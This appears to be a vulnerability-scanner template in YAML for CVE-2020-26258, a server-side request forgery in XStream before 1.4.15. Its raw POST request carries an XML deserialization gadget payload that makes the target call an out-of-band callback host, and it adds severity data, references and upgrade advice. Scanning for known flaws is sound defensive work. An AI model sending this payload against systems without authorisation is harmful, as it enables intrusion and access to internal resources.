http:
- matchers:
  - part: interactsh_protocol
    type: word
    words:
    - http
  - part: interactsh_request
    type: word
    words:
    - 'User-Agent: Java'
  matchers-condition: and
  raw:
  - "POST / HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/xml\n\n<map>\n\
    \  <entry>\n    <jdk.nashorn.internal.objects.NativeString>\n      <flags>0</flags>\n\
    \      <value class='com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data'>\n\
    \        <dataHandler>\n          <dataSource class='javax.activation.URLDataSource'>\n\
    \            <url>http://{{interactsh-url}}/internal/:</url>\n          </dataSource>\n\
    \          <transferFlavors/>\n        </dataHandler>\n        <dataLen>0</dataLen>\n\
    \      </value>\n    </jdk.nashorn.internal.objects.NativeString>\n    <string>test</string>\n\
    \  </entry>\n</map>\n"
id: CVE-2020-26258
info:
  author: pwnhxl
  classification:
    cpe: cpe:2.3:a:xstream_project:xstream:*:*:*:*:*:*:*:*
    cve-id: CVE-2020-26258
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N
    cvss-score: 7.7
    cwe-id: CWE-918
    epss-percentile: 0.99832
    epss-score: 0.9368
  description: 'XStream before 1.4.15 is susceptible to server-side request forgery.
    An attacker can request data from internal resources that are not publicly available
    by manipulating the processed input stream, thereby making it possible to obtain
    sensitive information, modify data, and/or execute unauthorized administrative
    operations.

    '
  impact: 'An attacker can exploit this vulnerability to make requests to internal
    resources, potentially leading to data leakage or further attacks.

    '
  metadata:
    max-request: 1
    product: xstream
    vendor: xstream_project
  name: XStream <1.4.15 - Server-Side Request Forgery
  reference:
  - https://x-stream.github.io/CVE-2020-26258.html
  - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-26258
  - https://github.com/x-stream/xstream/security/advisories/GHSA-4cch-wxpw-8p28
  - https://nvd.nist.gov/vuln/detail/CVE-2020-26258
  - https://lists.apache.org/thread.html/r97993e3d78e1f5389b7b172ba9f308440830ce5f051ee62714a0aa34@%3Ccommits.struts.apache.org%3E
  remediation: Install at least 1.4.15 if you rely on XStream's default blacklist
    of the Security Framework, and at least Java 15 or higher.
  severity: high
  tags: cve,cve2020,xstream,ssrf,oast,xstream_project,vuln
